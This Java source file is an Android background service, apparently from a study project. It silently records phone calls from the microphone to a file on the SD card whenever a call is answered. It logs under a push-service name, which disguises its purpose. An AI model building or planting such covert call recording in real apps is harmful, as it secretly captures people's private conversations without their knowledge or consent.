package com.highway.study.service;

import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Binder;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.IOException;

public class MyService extends Service {
    private static final String TAG = "GetuiPushService";
    private MediaRecorder recorder;
    @Override
    public void onCreate() {
        super.onCreate();
        Log.i(TAG, "onCreate called.");
        getService();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "onStartCommand called.");
        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public IBinder onBind(Intent intent) {
        Log.i(TAG, "onBind called.");
        return new Binder();
    }

    @Override
    public boolean onUnbind(Intent intent) {
        Log.i(TAG, "onUnbind called.");
        return super.onUnbind(intent);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.i(TAG, "onDestroy called.");
    }


    public void getService() {
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        telephonyManager.listen(
                new PhoneStateListener() {
                                    @Override
                                    public void onCallStateChanged(int state, String incomingNumber) {
                                        super.onCallStateChanged(state, incomingNumber);
                                        switch (state) {
                                            //电话空闲
                                            case TelephonyManager.CALL_STATE_IDLE:
                                                Log.i(TAG, "电话空闲");
                                                if(recorder != null){
                                                    //停止录音
                                                    recorder.stop();
                                                    //释放资源
                                                    recorder.release();
                                                    recorder = null;
                                                }
                                                break;
                                            //电话响铃
                                            case TelephonyManager.CALL_STATE_RINGING:
                                                Log.i(TAG, "电话响铃");
                                                if (recorder == null) {
                                                    getRecorder();
                                                }
                                                break;
                                            //正在通话
                                            case TelephonyManager.CALL_STATE_OFFHOOK:
                                                Log.i(TAG, "电话通话");
                                                if (recorder != null) {
                                                    recorder.start();
                                                }
                                                break;
                                        }
                                    }
                                }
                , PhoneStateListener.LISTEN_CALL_STATE);
    }

    private void getRecorder() {
        recorder = new MediaRecorder();
        //麦克风
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        //设置格式 3GP
        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        //设置保存目录 权限
        recorder.setOutputFile("sdcard/audio.3gp");
        //设置音频编码
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);

        try {
            //准备录音
            recorder.prepare();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
